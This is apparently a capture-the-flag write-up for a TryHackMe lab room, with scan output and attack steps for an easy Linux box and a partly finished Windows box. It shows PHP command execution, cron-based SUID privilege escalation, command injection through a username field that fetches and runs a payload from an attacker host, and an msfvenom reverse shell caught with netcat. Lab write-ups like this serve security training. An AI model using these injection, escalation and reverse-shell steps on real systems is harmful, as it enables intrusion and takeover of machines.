# Hacker of the Hill

**Date:** 15, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/hackerofthehill) to go to the TryHackMe room.

# Easy Challenge

## Enumeration

- Running nmap:

```bash
$ nmap -sC -sV -p- 10.10.156.206 -oN nmap-easy
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-15 19:11 IST

Nmap scan report for 10.10.156.206
Host is up (0.17s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:75:95:c7:6d:f4:92:a0:0e:1e:60:b8:be:4d:92:b1 (RSA)
|   256 a2:11:fb:e8:c5:c6:f8:98:b3:f8:d3:e3:91:56:b2:34 (ECDSA)
|_  256 72:19:b7:04:4c:df:18:be:6b:0f:9d:da:d5:14:68:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/vbcms
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VeryBasicCMS - Home
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: My Website
|_Requested resource was /?page=home.php
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Learn PHP
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 15 May 2021 13:57:41 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 15 May 2021 13:57:40 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=5/15%Time=609FD355%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x2020
SF:21\x2013:57:40\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2013:5
SF:7:41\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2013:57:41
SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1043.16 seconds
```

## Vbcms
- On `http://10.10.95.253:8000/robots.txt`

```
User-agent: *
Disallow: /vbcms
```

- Sign in with admin:admin in `http://10.10.95.253:8000/vbcms`
- May be a Rabbit Hole ;-)


## Exploiting the Webpage on Port 8001
- Visit `http://10.10.156.206:8002/lesson/1`
- We have PHP command execution on that webpage. So, we'll use `shell_exec` to execute shell commands.

### What is the user flag for the serv1 user?
- **Answer:** THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
- **Steps to Reproduce:**
    - By using the hint, we can cat the file `/usr/games/fortune`:

```php
echo shell_exec("cat /usr/games/fortune");

VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo=
```

    - It is base64 encoded.

```bash
$ echo VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo= | base64 -d

THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
```

---

### What is the user flag for the serv2 user?
- **Answer:** THM{Bet_You're_Glad_This_Is_Not_A_Hash}
- **Steps to Reproduce:** 
    - By using the hint, we can cat the file `/var/lib/rary`:

```php
echo shell_exec("cat /var/lib/rary");

 _____ _   _ __  __   ______       _    __   __          _              ____ _ 
|_   _| | | |  \/  | / / __ )  ___| |_  \ \ / /__  _   _( )_ __ ___    / ___| |
  | | | |_| | |\/| || ||  _ \ / _ \ __|  \ V / _ \| | | |/| '__/ _ \  | |  _| |
  | | |  _  | |  | < < | |_) |  __/ |_    | | (_) | |_| | | | |  __/  | |_| | |
  |_| |_| |_|_|  |_|| ||____/ \___|\__|___|_|\___/ \__,_| |_|  \___|___\____|_|
                     \_\             |_____|                      |_____|      
           _   _____ _     _         ___         _   _       _          _    
  __ _  __| | |_   _| |__ (_)___    |_ _|___    | \ | | ___ | |_       / \   
 / _` |/ _` |   | | | '_ \| / __|    | |/ __|   |  \| |/ _ \| __|     / _ \  
| (_| | (_| |   | | | | | | \__ \    | |\__ \   | |\  | (_) | |_     / ___ \ 
 \__,_|\__,_|___|_| |_| |_|_|___/___|___|___/___|_| \_|\___/ \__|___/_/   \_\
           |_____|             |_____|     |_____|             |_____|       
      _   _           _   __   
     | | | | __ _ ___| |__\ \  
     | |_| |/ _` / __| '_ \| | 
     |  _  | (_| \__ \ | | |> >
 ____|_| |_|\__,_|___/_| |_| | 
|_____|                   /_/  

```

---

### What is the user flag for the serv3 user?
- **Answer:** THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
- **Steps to Reproduce:** 
    - By using the hint, we can cat the file `/var/www/serv4/index.php`:

```php
echo shell_exec("cat /var/www/serv4/index.php");

THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
```

---

### What is the root.txt flag?
- **Answer:** THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
- **Steps to Reproduce:** 
   - To get the reverse shell, paste the **php-reverse-shell.php** code.
   - You can find the reverse shell code here:

```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

- For Privilege Escalation, we can use the **cron**. I just noticed that cron was running as root, by listing all the processes (`ps -aux`):

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /home/serv3/backups/backup.sh

$ cat /home/serv3/backups/backup.sh
#!/bin/bash
mv /backups/* /home/serv3/backups/files
```

- Privilege Escalation, by changing the permission of `/bin/bash`. 
- The argument `-p`	stands for **privileged** -	Script runs as **"suid"**.

```bash
$ echo "chmod 4777 /bin/bash" >> backup.sh
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash

$ /bin/bash -p

bash-4.4# cat /root/root.txt
THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
```

---

## Medium Challenge

## Enumeration - Nmap

```bash
nmap -sC -sV -p- 10.10.3.208  -oN nmap-medium 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-15 23:14 IST

Nmap scan report for 10.10.3.208
Host is up (0.15s latency).
Not shown: 65511 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: PhotoStore - Home
81/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Network Monitor
82/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-15 18:04:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TROY
|   NetBIOS_Domain_Name: TROY
|   NetBIOS_Computer_Name: TROY-DC
|   DNS_Domain_Name: troy.thm
|   DNS_Computer_Name: TROY-DC.troy.thm
|   DNS_Tree_Name: troy.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-15T18:06:29+00:00
| ssl-cert: Subject: commonName=TROY-DC.troy.thm
| Not valid before: 2021-02-18T18:07:12
|_Not valid after:  2021-08-20T18:07:12
|_ssl-date: 2021-05-15T18:07:07+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 15 May 2021 18:05:00 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 15 May 2021 18:04:59 GMT
|_    Content-Length: 0
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=5/15%Time=60A00D4B%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x2020
SF:21\x2018:04:59\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2018:0
SF:4:59\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2018:05:00
SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: TROY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-15T18:06:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1390.20 seconds
```


## Enumeration - Gobuster

```bash
gobuster dir -u http://10.10.3.208 -t 50 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.3.208
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/15 23:28:31 Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 0] [--> /login]
/login                (Status: 200) [Size: 2783]          
/logout               (Status: 302) [Size: 0] [--> /]     
/profile              (Status: 302) [Size: 0] [--> /login]
/signup               (Status: 200) [Size: 2903]          
/users                (Status: 301) [Size: 148] [--> http://10.10.3.208/users/]
                                                                               
===============================================================
2021/05/15 23:29:38 Finished
===============================================================
```

## Other Enumerations
- SMB
- LDAP


## Command Execution

- Block the **script.js** which santizies the input.
- Change the username in the HTTP server running on Port 80: `admin | curl 10.17.7.91:8000/poc`

- Listen on Port 8000 

```bash
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.3.208 - - [16/May/2021 00:25:31] "GET /nmap-medium HTTP/1.1" 200 -
10.10.3.208 - - [16/May/2021 00:25:31] code 404, message File not found
10.10.3.208 - - [16/May/2021 00:25:31] "GET /poc HTTP/1.1" 404 -
```

- We made sure that we have command execution.

## Reverse shell

- Using **msfvenom**, generate a reverse shell for windows:

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.7.91 LPORT=1234 -f exe > reverse.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

```

- Host a server, so that you can transfer the `reverse.exe` to the target. Simultaneously, change the username to `admin | curl 10.17.7.91:8000/reverse.exe -o reverse.exe`

```bash
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.3.208 - - [16/May/2021 00:42:01] "GET /reverse.exe HTTP/1.1" 200 -
```

- Listen on the appropriate port using netcat. Simultaneously, change the username to `admin | reverse.exe`. Now we get the shell of the user **agamemnon**.

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.3.208] 50144
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\agamemnon\Desktop\WebApp\public>
```


### 
- **Answer:** 
- **Steps to Reproduce:** 

```powershell
C:\Users\agamemnon\Desktop> type flag.txt
type flag.txt

THM{78ab0f3ab9decf59899148c6ba7e07dc}
```

---

---

## Hard Challenge


---

## References
- [Advanced Bash Scripting Guide](https://tldp.org/LDP/abs/html/options.html)